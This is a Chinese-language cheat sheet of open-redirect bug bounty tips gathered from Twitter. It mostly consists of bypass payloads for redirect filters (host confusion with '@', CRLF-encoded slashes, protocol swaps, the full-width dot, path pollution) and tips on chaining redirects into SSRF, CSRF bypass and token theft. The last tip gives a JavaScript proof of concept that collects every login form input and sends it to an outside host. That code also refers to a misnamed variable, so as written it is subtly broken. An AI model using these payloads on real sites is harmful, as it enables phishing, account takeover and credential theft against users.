# Open Redirect BugBountyTips

### 开放式重定向 (Open Redirect):

1.[@LooseSecurity](https://twitter.com/LooseSecurity/status/1164579967184887809)：

```bash
file.php?url=/admin/
重定向到website.com/admin/
输入网址file.php?url=@google.com
现在是website.com@google.com重定向到http://google.com.
```

2.[@k33r0k](https://twitter.com/k33r0k/status/1081589568405671936)：在某些情况下，您可以使用％0d％0a并在主网址上直接使用两个'/'进行'Open Redirect'.

```s
http://victim//%0d%0ahttp://google.com/
```

3.[@neeraj_sonaniya](https://twitter.com/neeraj_sonaniya/status/1086911248845828101):尝试更改协议以绕过开放式重定向保护:

```s
http://example.com -> ftp://example.com
```

4.@LooseSecurity:保留您的开放式重定向。如果遇到SSRF，则可以使用开放式重定向来绕过same-origin filters。如果他们只是阻止localhost，则在您自己的网站上创建重定向。

5.@sandh0t:始终检查重定向页面（302/301）的内容。特别是在需要验证的情况下。
并记住，重定向页面是测试CRLF注入和打开重定向等问题的好地方。

6.[@LooseSecurity](https://twitter.com/LooseSecurity/status/1179149212874952704):对于开放式重定向，请尝试使用以下字符："。"网站认为它正在重定向到站点上的页面，但浏览器将其转换为"。"。从而完成重定向。

```bash
Usage: ?url=//google。com
Goes to: https://google.com
URL encoded: %E3%80%82
```

7.@kunalp94:"/%0d/domain_address" 是帐户接管窃取令牌中的最佳绕过方式之一。

8.[@PD_5ive](https://twitter.com/PD_5ive/status/1205402391526486017):遇到的一些打开重定向的参数，一些可能导致XSS：

```url
RedirectUrl
Return
ReturnUrl
ClientSideUrl
failureUrl
ru
redir
relayState
fallbackurl
clickurl
return_to
url
goto
dest_url
urlReturn
referer
appUrlScheme
```

9.[@0xw2w](https://twitter.com/0xw2w/status/1248688218326863872):如果有一个GET请求，开发人员在其中添加了基于referer-based的CSRF保护，请对该网址使用Open Redirect，以在referer标头中获得列入白名单的网站。如果您有POST请求，请尝试将方法更改为GET。

10.[@darklotuskdb](https://twitter.com/darklotuskdb/status/1260837629718740992):通过HTTP污染攻击打开重定向：

```bash
URL -> sub.dom-co/go/https/dom-co

1) sub.dom-co/go/https/dom-co.evil-co/
-> 404

2) sub.dom-co/go/https/dom-co/go/https/dom-co.evil-co/
-> Redirected To Evil website
```

11.[@xhzeem](https://twitter.com/xhzeem/status/1268098531186728963):当您在登录页面上通过开放重定向找到XSS时，只需捕获凭据并劫持它们,PoC：

```js
javascript:inpts=document.querySelectorAll('input');info='';for(i=0;i<inpts.length;i++){info+=','+inputs[i].value};location.href='https://xhze.em/?'+info
```



